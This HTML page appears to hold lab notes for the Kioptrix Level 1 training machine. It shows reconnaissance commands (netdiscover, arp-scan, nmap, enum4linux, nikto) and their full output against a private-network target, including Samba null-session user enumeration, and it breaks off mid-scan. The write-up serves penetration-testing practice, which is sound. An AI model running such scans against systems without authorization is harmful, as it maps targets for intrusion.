@@ -1,0 +1,786 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Kioptrix Level 1</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/css/lightgallery.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.css" rel="stylesheet">
+        <!-- Add Pygments CSS for code highlighting -->
+        <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.highlight .hll { background-color: #ffffcc }
+.highlight { background: #f8f8f8; }
+.highlight .c { color: #3D7B7B; font-style: italic } /* Comment */
+.highlight .err { border: 1px solid #FF0000 } /* Error */
+.highlight .k { color: #008000; font-weight: bold } /* Keyword */
+.highlight .o { color: #666666 } /* Operator */
+.highlight .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.highlight .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #9C6500 } /* Comment.Preproc */
+.highlight .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.highlight .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #A00000 } /* Generic.Deleted */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #E40000 } /* Generic.Error */
+.highlight .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.highlight .gi { color: #008400 } /* Generic.Inserted */
+.highlight .go { color: #717171 } /* Generic.Output */
+.highlight .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.highlight .gt { color: #0044DD } /* Generic.Traceback */
+.highlight .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.highlight .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.highlight .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.highlight .kp { color: #008000 } /* Keyword.Pseudo */
+.highlight .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #B00040 } /* Keyword.Type */
+.highlight .m { color: #666666 } /* Literal.Number */
+.highlight .s { color: #BA2121 } /* Literal.String */
+.highlight .na { color: #687822 } /* Name.Attribute */
+.highlight .nb { color: #008000 } /* Name.Builtin */
+.highlight .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+.highlight .no { color: #880000 } /* Name.Constant */
+.highlight .nd { color: #AA22FF } /* Name.Decorator */
+.highlight .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.highlight .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #0000FF } /* Name.Function */
+.highlight .nl { color: #767600 } /* Name.Label */
+.highlight .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+.highlight .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.highlight .nv { color: #19177C } /* Name.Variable */
+.highlight .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mb { color: #666666 } /* Literal.Number.Bin */
+.highlight .mf { color: #666666 } /* Literal.Number.Float */
+.highlight .mh { color: #666666 } /* Literal.Number.Hex */
+.highlight .mi { color: #666666 } /* Literal.Number.Integer */
+.highlight .mo { color: #666666 } /* Literal.Number.Oct */
+.highlight .sa { color: #BA2121 } /* Literal.String.Affix */
+.highlight .sb { color: #BA2121 } /* Literal.String.Backtick */
+.highlight .sc { color: #BA2121 } /* Literal.String.Char */
+.highlight .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.highlight .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.highlight .s2 { color: #BA2121 } /* Literal.String.Double */
+.highlight .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.highlight .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.highlight .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.highlight .sx { color: #008000 } /* Literal.String.Other */
+.highlight .sr { color: #A45A77 } /* Literal.String.Regex */
+.highlight .s1 { color: #BA2121 } /* Literal.String.Single */
+.highlight .ss { color: #19177C } /* Literal.String.Symbol */
+.highlight .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #0000FF } /* Name.Function.Magic */
+.highlight .vc { color: #19177C } /* Name.Variable.Class */
+.highlight .vg { color: #19177C } /* Name.Variable.Global */
+.highlight .vi { color: #19177C } /* Name.Variable.Instance */
+.highlight .vm { color: #19177C } /* Name.Variable.Magic */
+.highlight .il { color: #666666 } /* Literal.Number.Integer.Long */</style>
+        <style>
+            /* Center the HTML file on the screen */
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                padding-top: 30px;
+            }
+            /* Make the display width of the HTML file smaller */
+            .container {
+                max-width: 42vw;
+                margin: 0 auto;
+                height: 100%
+            }
+            
+            img {
+                width: 80%;
+            }
+        </style>
+        <script src="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/js/lightgallery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-zoom.js/dist/lg-zoom.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js/dist/lg-fullscreen.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-share.js/dist/lg-share.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js/dist/lg-autoplay.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-rotate.js/dist/lg-rotate.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-flip.js/dist/lg-flip.min.js"></script>
+        <script>
+            window.onload = function() {
+                const images = document.getElementsByTagName('img');
+                const lightGalleryItems = [];
+                for (let i = 0; i < images.length; i++) {
+                    const img = images[i];
+                    if (img.naturalWidth > 1000) {
+                        if (window.innerWidth > 768) {
+                            img.style.width = '110%';
+                            img.style.transform = 'translateX(-4%)';
+                        } else {
+                            img.style.width = '100%';
+                            img.style.transform = 'none';
+                        }
+                    }
+                    lightGalleryItems.push({ src: img.src, thumb: img.src });
+                    img.setAttribute('data-lg-idx', i);
+                    img.addEventListener('click', function() {
+                        lightGallery(img, {
+                            dynamic: true,
+                            dynamicEl: lightGalleryItems,
+                            index: parseInt(img.getAttribute('data-lg-idx'))
+                        });
+                    });
+                }
+            };
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <h1 style="text-align:center; text-transform:uppercase; font-family: 'Playfair Display', serif; font-weight:700;"">Kioptrix Level 1</h1>
+
+<p>Monday, August 1, 2022</p>
+<p>11:08 PM</p>
+<p>SCAN HOST:</p>
+<p>sudo netdiscover -r 192.168.1.0/24</p>
+<p>arp-scan -l</p>
+<p>SCAN PORT:</p>
+<p>nmap -A 192.168.1.4</p>
+<p>Starting Nmap 7.92 (  ) at 2022-08-01 05:14 EDT</p>
+<p>Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</p>
+<p>Service scan Timing: About 16.67% done; ETC: 05:15 (0:00:30 remaining)</p>
+<p>Nmap scan report for 192.168.1.4</p>
+<p>Host is up (0.0020s latency).</p>
+<p>Not shown: 994 closed tcp ports (reset)</p>
+<p>PORT          STATE SERVICE         VERSION</p>
+<p>22/tcp        open  ssh             OpenSSH 2.9p2 (protocol 1.99)</p>
+<p>|_sshv1: Server supports SSHv1</p>
+<p>| ssh-hostkey:</p>
+<p>|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</p>
+<p>|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</p>
+<p>|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</p>
+<p>80/tcp    open  http            Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</p>
+<p>|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p>
+<p>|_http-title: Test Page for the Apache Web Server on Red Hat Linux</p>
+<p>| http-methods:</p>
+<p>|_  Potentially risky methods: TRACE</p>
+<p>111/tcp   open  rpcbind         2 (RPC #100000)</p>
+<p>| rpcinfo:</p>
+<p>|   program version        port/proto  service</p>
+<p>|   100000  2                111/tcp   rpcbind</p>
+<p>|   100000  2                111/udp   rpcbind</p>
+<p>|   100024  1              32768/tcp   status</p>
+<p>|_  100024  1              32768/udp   status</p>
+<p>139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)</p>
+<p>443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p>
+<p>|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p>
+<p>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</p>
+<p>| Not valid before: 2009-09-26T09:32:06</p>
+<p>|_Not valid after:  2010-09-26T09:32:06</p>
+<p>|_ssl-date: 2022-08-01T13:14:50+00:00; +3h59m58s from scanner time.</p>
+<p>| sslv2:</p>
+<p>|   SSLv2 supported</p>
+<p>|   ciphers:</p>
+<p>|         SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</p>
+<p>|         SSL2_RC4_128_EXPORT40_WITH_MD5</p>
+<p>|         SSL2_RC4_64_WITH_MD5</p>
+<p>|         SSL2_DES_64_CBC_WITH_MD5</p>
+<p>|         SSL2_RC2_128_CBC_WITH_MD5</p>
+<p>|         SSL2_DES_192_EDE3_CBC_WITH_MD5</p>
+<p>|_        SSL2_RC4_128_WITH_MD5</p>
+<p>|_http-title: 400 Bad Request</p>
+<p>32768/tcp open  status          1 (RPC #100024)</p>
+<p>MAC Address: 08:00:27:60:13:70 (Oracle VirtualBox virtual NIC)</p>
+<p>Device type: general purpose</p>
+<p>Running: Linux 2.4.X</p>
+<p>OS CPE: cpe:/o:linux:linux_kernel:2.4</p>
+<p>OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</p>
+<p>Network Distance: 1 hop</p>
+<p>Host script results:</p>
+<p>|_clock-skew: 3h59m57s</p>
+<p>|_smb2-time: Protocol negotiation failed (SMB2)</p>
+<p>|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)</p>
+<p>TRACEROUTE</p>
+<p>HOP RTT         ADDRESS</p>
+<p>1   2.04 ms 192.168.1.4</p>
+<p>OS and Service detection performed. Please report any incorrect results at  .</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds</p>
+<p>enum4linux -a 192.168.1.4</p>
+<p>Starting enum4linux v0.9.1 (  ) on Mon Aug  1 04:53:00 2022</p>
+<p>=========================================( Target Information )=========================================</p>
+<p>Target ........... 192.168.1.4</p>
+<p>RID Range ........ 500-550,1000-1050</p>
+<p>Username ......... ''</p>
+<p>Password ......... ''</p>
+<p>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>
+<p>============================( Enumerating Workgroup/Domain on 192.168.1.4 )============================</p>
+<p>[+] Got domain/workgroup name: MYGROUP</p>
+<p>================================( Nbtstat Information for 192.168.1.4 )================================</p>
+<p>Looking up status of 192.168.1.4</p>
+<p>KIOPTRIX            &lt;00&gt; -             B <ACTIVE>  Workstation Service</p>
+<p>KIOPTRIX            &lt;03&gt; -             B <ACTIVE>  Messenger Service</p>
+<p>KIOPTRIX            &lt;20&gt; -             B <ACTIVE>  File Server Service</p>
+<p>MYGROUP             &lt;00&gt; - <GROUP> B <ACTIVE>  Domain/Workgroup Name</p>
+<p>MYGROUP             &lt;1e&gt; - <GROUP> B <ACTIVE>  Browser Service Elections</p>
+<p>MAC Address = 00-00-00-00-00-00</p>
+<p>====================================( Session Check on 192.168.1.4 )====================================</p>
+<p>[+] Server 192.168.1.4 allows sessions using username '', password ''</p>
+<p>=================================( Getting domain SID for 192.168.1.4 )=================================</p>
+<p>Domain Name: MYGROUP</p>
+<p>Domain Sid: (NULL SID)</p>
+<p>[+] Can't determine if host is part of domain or part of a workgroup</p>
+<p>===================================( OS information on 192.168.1.4 )===================================</p>
+<p>[E] Can't get OS info with smbclient</p>
+<p>[+] Got OS info for 192.168.1.4 from srvinfo:</p>
+<p>KIOPTRIX           Wk Sv PrQ Unx NT SNT Samba Server</p>
+<p>platform_id         :           500</p>
+<p>os version          :           4.5</p>
+<p>server type         :           0x9a03</p>
+<p>========================================( Users on 192.168.1.4 )========================================</p>
+<p>Use of uninitialized value $users in print at ./enum4linux.pl line 972.</p>
+<p>Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.</p>
+<p>Use of uninitialized value $users in print at ./enum4linux.pl line 986.</p>
+<p>Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.</p>
+<p>==================================( Share Enumeration on 192.168.1.4 )==================================</p>
+<p>Sharename           Type          Comment</p>
+<p>---------           ----          -------</p>
+<p>IPC$                IPC           IPC Service (Samba Server)</p>
+<p>ADMIN$              IPC           IPC Service (Samba Server)</p>
+<p>Reconnecting with SMB1 for workgroup listing.</p>
+<p>Server                   Comment</p>
+<p>---------                -------</p>
+<p>KIOPTRIX                 Samba Server</p>
+<p>Workgroup                Master</p>
+<p>---------                -------</p>
+<p>MYGROUP</p>
+<p>[+] Attempting to map shares on 192.168.1.4</p>
+<p>[E] Can't understand response:</p>
+<p>NT_STATUS_NETWORK_ACCESS_DENIED listing *</p>
+<p>//192.168.1.4/IPC$          Mapping: N/A Listing: N/A Writing: N/A</p>
+<p>[E] Can't understand response:</p>
+<p>tree connect failed: NT_STATUS_WRONG_PASSWORD</p>
+<p>//192.168.1.4/ADMIN$        Mapping: N/A Listing: N/A Writing: N/A</p>
+<p>============================( Password Policy Information for 192.168.1.4 )============================</p>
+<p>[E] Unexpected error from polenum:</p>
+<p>[+] Attaching to 192.168.1.4 using a NULL share</p>
+<p>[+] Trying protocol 139/SMB...</p>
+<p>[!] Protocol failed: SMB SessionError: 0x5</p>
+<p>[+] Trying protocol 445/SMB...</p>
+<p>[!] Protocol failed: [Errno Connection error (192.168.1.4:445)] [Errno 111] Connection refused</p>
+<p>[+] Retieved partial password policy with rpcclient:</p>
+<p>Password Complexity: Disabled</p>
+<p>Minimum Password Length: 0</p>
+<p>=======================================( Groups on 192.168.1.4 )=======================================</p>
+<p>[+] Getting builtin groups:</p>
+<p>group:[Administrators] rid:[0x220]</p>
+<p>group:[Users] rid:[0x221]</p>
+<p>group:[Guests] rid:[0x222]</p>
+<p>group:[Power Users] rid:[0x223]</p>
+<p>group:[Account Operators] rid:[0x224]</p>
+<p>group:[System Operators] rid:[0x225]</p>
+<p>group:[Print Operators] rid:[0x226]</p>
+<p>group:[Backup Operators] rid:[0x227]</p>
+<p>group:[Replicator] rid:[0x228]</p>
+<p>[+]  Getting builtin group memberships:</p>
+<p>Group: Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators</p>
+<p>Group: Guests' (RID: 546) has member: Couldn't find group Guests</p>
+<p>Group: Power Users' (RID: 547) has member: Couldn't find group Power Users</p>
+<p>Group: Administrators' (RID: 544) has member: Couldn't find group Administrators</p>
+<p>Group: Replicator' (RID: 552) has member: Couldn't find group Replicator</p>
+<p>Group: Print Operators' (RID: 550) has member: Couldn't find group Print Operators</p>
+<p>Group: Users' (RID: 545) has member: Couldn't find group Users</p>
+<p>Group: System Operators' (RID: 549) has member: Couldn't find group System Operators</p>
+<p>Group: Account Operators' (RID: 548) has member: Couldn't find group Account Operators</p>
+<p>[+]  Getting local groups:</p>
+<p>group:[sys] rid:[0x3ef]</p>
+<p>group:[tty] rid:[0x3f3]</p>
+<p>group:[disk] rid:[0x3f5]</p>
+<p>group:[mem] rid:[0x3f9]</p>
+<p>group:[kmem] rid:[0x3fb]</p>
+<p>group:[wheel] rid:[0x3fd]</p>
+<p>group:[man] rid:[0x407]</p>
+<p>group:[dip] rid:[0x439]</p>
+<p>group:[lock] rid:[0x455]</p>
+<p>group:[users] rid:[0x4b1]</p>
+<p>group:[slocate] rid:[0x413]</p>
+<p>group:[floppy] rid:[0x40f]</p>
+<p>group:[utmp] rid:[0x415]</p>
+<p>[+]  Getting local group memberships:</p>
+<p>[+]  Getting domain groups:</p>
+<p>group:[Domain Admins] rid:[0x200]</p>
+<p>group:[Domain Users] rid:[0x201]</p>
+<p>[+]  Getting domain group memberships:</p>
+<p>Group: 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins</p>
+<p>Group: 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users</p>
+<p>===================( Users on 192.168.1.4 via RID cycling (RIDS: 500-550,1000-1050) )===================</p>
+<p>[I] Found new SID:</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623</p>
+<p>[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)</p>
+<p>S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)</p>
+<p>================================( Getting printer info for 192.168.1.4 )================================</p>
+<p>No printers returned.</p>
+<p>enum4linux complete on Mon Aug  1 04:53:08 2022</p>
+<p>nikto -h</p>
+<h2>- Nikto v2.1.6</h2>
+<ul>
+<li>
+<p>Target IP:              192.168.1.4</p>
+</li>
+<li>
+<p>Target Hostname:        192.168.1.4</p>
+</li>
+<li>
+<p>Target Port:            80</p>
+</li>
+<li>
+<p>Start Time:             2022-08-01 05:14:12 (GMT-4)</p>
+</li>
+</ul>
+<hr />
+<ul>
+<li>
+<p>Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p>
+</li>
+<li>
+<p>Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001</p>
+</li>
+<li>
+<p>The anti-clickjacking X-Frame-Options header is not present.</p>
+</li>
+<li>
+<p>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
+</li>
+<li>
